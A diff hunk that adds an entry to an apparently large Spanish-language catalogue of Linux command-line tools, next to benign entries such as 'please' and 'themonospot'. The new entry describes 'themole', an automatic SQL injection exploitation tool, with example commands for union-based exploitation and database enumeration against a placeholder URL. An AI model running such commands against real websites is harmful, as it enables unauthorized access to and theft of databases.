@@ -61959,6 +61959,13 @@ Tambien puede lanzarse y que se ejecute sin preguntar:
 $ please -y
 
 
+themole
+Herramienta de explotación automática de inyecciones SQL. Basta con proporcionar una URL vulnerable y una cadena válida presente en el sitio para que la herramienta detecte la inyección y la explote, ya sea mediante la técnica «union» o mediante una técnica basada en consultas booleanas.
+$ themole -u "http://ejemplo.com/product?id=1" -p "nombre_del_producto" (web vulnerable y cadena válida para validar la inyección)
+$ themole -u "http://ejemplo.com/product?id=1" -p "nombre_del_producto" --technique union (indicando que se use la técnica de UNION para intentar la explotación)
+$ themole -u "http://ejemplo.com/product?id=1" -p "nombre_del_producto" --retrieve-databases (extraer información sobre las bases de datos disponibles)
+
+
 themonospot
 Aplicación para escanear archivos .avi o .mkv para obtener información sobre sobre el flujo de datos de audio y video. Esta aplicación nos dirá el codec usado, la calidad del audio, resolución, etc…
 $ themonospot video.avi
